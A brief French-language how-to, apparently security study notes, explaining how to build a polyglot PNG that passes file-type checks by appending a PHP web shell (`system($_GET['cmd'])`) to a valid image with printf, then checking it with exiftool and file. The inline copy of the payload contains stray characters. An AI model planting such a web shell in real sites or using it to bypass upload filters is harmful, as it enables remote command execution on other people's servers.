Pour créer un fichier polyglote(Interprèté de manières différentes selon le système de vérification), on peut utiliser des outils comme `exiftool` , `file` , pour y arriver.

-Tout d'abord, il faut avoir un fichier PNG (Il est préférable de trouver un fichier png valide au lieu d'en créer un a la main) 

-Ensuite, copier le fichier pour expérimenter librement avec la copie

-Par exemple, pour ajouter le payload `<?php system(¨¨$_GET["cmd"]); ?>` a la fin d'un fichier `polyglot.png:

```
printf '%s' '<?php system($_GET["cmd"]); ?>' >> polyglot.png
```

`
Vérifier les caractéristiques du fichier avec exiftool et file.